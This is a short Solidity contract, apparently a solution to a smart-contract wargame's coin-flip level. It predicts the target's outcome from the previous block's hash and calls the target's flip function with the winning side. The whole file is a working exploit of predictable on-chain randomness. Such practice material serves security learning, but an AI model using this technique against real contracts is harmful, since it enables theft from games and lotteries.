// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.4;

// import { console } from "forge-std/console.sol";

import { ICoinFlip } from "src/CoinFlip/ICoinFlip.sol";

contract CoinFlipAttack {
    function callCoinFlip(address coinFlipInstance) public returns (bool) {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        // determine what the next correct coinFlip value will be
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        /* EASY WAY */
        // bool success = ICoinFlip(coinFlipInstance).flip(side);

        /* HARDER WAY */
        // get function selector
        bytes4 flipSelector = ICoinFlip.flip.selector;
        // call coinFlip function on target contract
        (bool success, ) = coinFlipInstance.call(abi.encodeWithSelector(flipSelector, side));

        return success;

    }
}
